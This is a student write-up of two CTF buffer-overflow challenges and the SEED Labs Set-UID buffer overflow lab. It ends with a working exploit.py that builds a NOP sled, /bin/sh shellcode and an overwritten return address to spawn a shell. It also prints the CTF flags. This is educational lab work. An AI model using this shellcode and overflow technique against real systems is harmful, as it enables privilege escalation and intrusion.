# CTF

## Challenge 1

### Recon

- We identified the security properties of the given program, with the help of the `checksec` tool.
- There was no canary protecting the return address and the stack has execution permission.

### Vulnerability

The program read a file (mem.txt), and in order to get the flag we needed to change which file the program read. The path to the file was kept in the variable meme_file. The only moment in the execution of the program in which the user intervenes is when he gets to give a text input, that will be kept in a 20 byte buffer.

We understood the vulnerability would be connected to said buffer, and could be exploited by creating a buffer overflow. If we wrote more than 20 characters a buffer overflow would occur. We knew we could write on the stack and change other variables and we knew meme_file was next to the buffer on the stack. So in order to access flag.txt we sent as the input something like "[20 characters to fill the buffer]flag.txt". This changed the variable mem_file to "flag.txt" and we found the flag - `flag{8df95b4dbd7681ec6e6688826ae6fd12}`.

## Challenge 2

### Recon

- Just like before, we identified the security properties of the given program, with the help of the `checksec` tool.
- There was no canary protecting the return address and the stack has execution permission, once again.

### Vulnerability

The difference this time in the program, was a new variable "val", an array of 4 characters. The program would only open the text file if the condition `*(long*)val == 0xfefc2122` was met.

We identified the same opportunity to create a buffer overflow, except this time the variables were in the following order in the stack: buffer->val->mem_file. So we used the Python script to send the input "[20 characters to fill the buffer][0x22][0x21][0xfc][0xfe]flag.txt". This way the condition was met and we changed the variable mem_file to "flag.txt", just like in the first challenge. Doing this we found the flag - `flag{031964c904407b7f31a925abe31d5d1f}`.

# SEED Labs

## Buffer Overflow Attack Lab (Set-UID Version)

### Task 1: Getting Familiar with Shellcode

- We were able to understand the shellcode and run the generated 32 bit binary that executed the shellcode.
- A shell was launched when executing the binary, as expected.

### Task 2: Understanding the Vulnerable Program

- We understood how the program had a buffer overflow vulnerability, since it was copying a 517 bytes buffer to a 100 bytes one. This opens the possibility to get a root shell.
- By using the `make` command, we compiled the vulnerable program with flags for turning off StackGuard and the non-executable stack protections and set it as a root owned Set-UID program.

### Task 3: Launching Attack on 32-bit Program (Level 1)

To find the difference between the buffer's starting and the place where the return address is stored, we created a file named 'badfile' and launched gdb on the vulnerable program, registering the ebp and buffer address (`0xffffca48` and `0xffffc9dc`, respectively) after function `bof` is called. By calculating the difference between the addresses, we find that these are 108 bytes apart.

Next, we needed to generate the contents of the 'badfile' with the shellcode and a precisely placed return address that would overwrite the `bof`'s function return address in the stack and lead the program to run the shellcode. For that, by using the provided `exploit.py` file, we crated a 'badfile' of 517 bytes (the size of the `str` buffer) filled with NOP instructions (0x90) and the shellcode at the end. Since the ebp address was 108 bytes away from the starting address of the buffer, and the return address comes before ebp, we placed a return address on byte 112 (108 + address size of 4 bytes) of the 'badfile'. This return address was the buffer address plus 300, which would give us an address of one of the NOP instructions. By doing that, the program would return from the `bof` function to a NOP sled, that would lead it to run the shellcode. By running the program we successfully got a shell.

This was the resulting `exploit.py` file:

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode) - 1 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffc9dc + 300
offset = 112

L = 4     # 32-bit address size
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

